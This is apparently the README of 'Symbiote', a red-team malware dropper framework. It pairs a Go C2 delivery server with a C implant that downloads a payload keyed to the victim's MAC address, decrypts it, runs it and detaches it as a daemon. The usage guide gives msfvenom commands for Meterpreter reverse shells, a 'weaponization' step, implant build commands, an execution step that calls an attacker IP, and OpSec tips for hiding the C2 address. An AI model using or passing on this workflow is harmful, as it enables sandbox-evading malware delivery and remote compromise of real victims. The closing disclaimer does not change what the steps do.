# 🦠 Symbiote: Environmental Keyed Payload Delivery

![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)
![C](https://img.shields.io/badge/C-Implant-A8B9CC?style=flat&logo=c)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey)
![Category](https://img.shields.io/badge/Category-Red%20Team%20%2F%20Evasion-red)

**Symbiote** is a cross-platform malware delivery system designed to evade sandbox analysis and forensic investigation. It utilizes **Environmental Keying**, meaning the payload is encrypted using the target machine's physical hardware ID (MAC Address). If the payload is executed in a sandbox, a researcher's VM, or any machine other than the intended target, it fails to decrypt and remains harmless garbage data.

---

## 🧐 What is this tool?
Symbiote is a **Staged Dropper Framework**. It consists of two parts:
1.  **The Commander (Go CLI):** A tool for attackers to encrypt payloads and host a secure delivery server.
2.  **The Implant (C Agent):** A lightweight program that runs on the victim, fetches the encrypted payload, decrypts it using the local hardware key, and executes it.

### 💡 What problem does it solve?
In modern Red Teaming, **Payload Delivery** is a critical point of failure.
* **Problem:** If Blue Teams or Automated Sandboxes intercept your delivery URL, they can download your payload, analyze it, and write a signature for it before you even start your attack.
* **Solution:** Symbiote ensures that **even if the Blue Team downloads your payload**, they cannot run it. The file is cryptographically locked to the physical hardware of the intended victim. Without the victim's specific network card (MAC address), the file is just useless noise.

---

## 🏗️ Architecture

Symbiote operates on a **"Lock and Key"** model:

1.  **The Lock (Builder):** The payload is XOR-encrypted using the victim's MAC address.
2.  **The Guard (C2 Server):** A Go-based HTTP server hosts the file but only serves it to agents with a specific secret User-Agent.
3.  **The Key (Implant):** A C-based dropper runs on the victim, detects its own MAC address, downloads the payload, decrypts it in memory, and executes it as a background daemon.


# ✨ Key Features
🔒 Anti-Forensics / Sandbox Evasion: The payload is cryptographically locked to the specific hardware of the target.

🐧 🪟 Cross-Platform Support: Single codebase supports both Windows (WinHTTP, ShellExecute) and Linux (Sockets, Fork/Setsid).

👻 Daemonization: Implants automatically fork and detach from the terminal (setsid), redirecting IO to /dev/null to ensure persistence.

💾 Universal Dropper: Capable of dropping and executing ANY file type (ELF, EXE, Python Scripts, Shell Scripts, PDFs), not just raw shellcode.

🛡️ C2 Traffic Filtering: The delivery server rejects standard web crawlers and Blue Team scanners.

📦 Installation & Build
Before using the tool, you must compile the Commander (Go CLI) on your attacker machine.

# Prerequisites
Go (Golang): To build the commander tool.

GCC / MinGW: To compile the C implant.

Target Access: You need to know the target's MAC address beforehand (Reconnaissance).

# Steps

Clone the Repository:
git clone [https://github.com/007Atharvmd/Symbiote.git]
cd Symbiote


Build the Tool:

# Initialize Go modules
go mod tidy

# If you are on Windows:
go build -o symbiote.exe main.go

# If you are on Linux/Mac:
go build -o symbiote main.go
You now have the executable CLI tool (symbiote.exe or symbiote) ready to use.

# 📚 Command Reference
Once built, the tool provides built-in help menus.


$ ./symbiote
A Red Team tool to generate and serve hardware-locked payloads.

Usage:
  symbiote [command]

Available Commands:
  build       Encrypts a payload using a target MAC address
  completion  Generate the autocompletion script for the specified shell
  help        Help about any command
  serve       Starts the C2 delivery server

Flags:
  -h, --help   help for symbiote


## Build Command
Used to encrypt your malicious file.


$ ./symbiote build -h
Encrypts a payload using a target MAC address

Usage:
  symbiote build [flags]

Flags:
  -h, --help           help for build
  -i, --input string   Input raw shellcode file (default "calc.bin")
  -m, --mac string     Target MAC Address (Required)
  -o, --out string     Output filename (default "favicon.ico")


## Serve Command
Used to host the C2 server.

Plaintext

$ ./symbiote serve -h
Starts the C2 delivery server

Usage:
  symbiote serve [flags]

Flags:
  -f, --file string    Payload file to serve (default "favicon.ico")
  -h, --help           help for serve
  -p, --port string    Port to listen on (default "8080")

🚀 Usage Guide
# 1. Reconnaissance
Obtain the MAC address of your target machine.

Linux: ip link or ifconfig (e.g., 08-8F-C3-12-3F-0E)

Windows: ipconfig /all

# 2. Payload Generation
You can use ANY executable payload (C2 Agents, Reverse Shells, Ransomware Simulators, etc.).

# Example using MSFVenom (Stageless Meterpreter): Linux Payload:

msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f elf -o malware.elf


# Windows Payload:

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe -o malware.exe


# 3. Weaponization (Encryption)
Use your compiled Symbiote tool to lock the payload to the target.


 Syntax: ./symbiote build --mac <TARGET_MAC> --input <PAYLOAD_FILE>

 Example (Windows PowerShell)
./symbiote.exe build --mac 08-8F-C3-12-3F-0E --input malware.elf
Output: favicon.ico (Encrypted file)

# 4. Compile the Implant
NOTE: Ideally, you should compile the implant on the victim machine (or a machine with the exact same OS architecture/libraries) to avoid compatibility issues like "GLIBC version mismatch."

For Linux Targets:

gcc implant/implant.c -o implant-linux


For Windows Targets:


gcc implant/implant.c -o implant.exe -lwinhttp -liphlpapi -lshell32

# 5. Execution (The Attack)
Terminal 1: Attacker (C2 Server) Start the delivery server using your tool.

Windows
./symbiote.exe serve --port 8080

Linux
./symbiote serve --port 8080

Terminal 2: Victim (Implant) Run the compiled implant, pointing it to the attacker's IP.

./implant <ATTACKER_IP> <PORT>
./implant-linux 192.168.1.50 8080


# ⚠️ Operational Security (OpSec) Notes
Runtime Arguments: Currently, the C2 IP is passed via command line arguments for testing flexibility. In a real engagement, this should be hardcoded or patched into the binary to avoid process listing detection (ps aux).

Disk Drop: This tool acts as a Dropper (writes to %TEMP% or /tmp). While this ensures compatibility with complex binaries (ELF/EXE), it is less stealthy than pure in-memory injection.

# 🚧 Beta Notice
This tool is currently in BETA. It has not been thoroughly tested on all Linux distributions or Windows versions. You may encounter issues with specific network configurations or library dependencies. Use with caution.

# ⚖️ Disclaimer
This project is for educational purposes and authorized Red Team engagements only.

The author is not responsible for any misuse of this tool. Do not use this against systems you do not have explicit permission to test.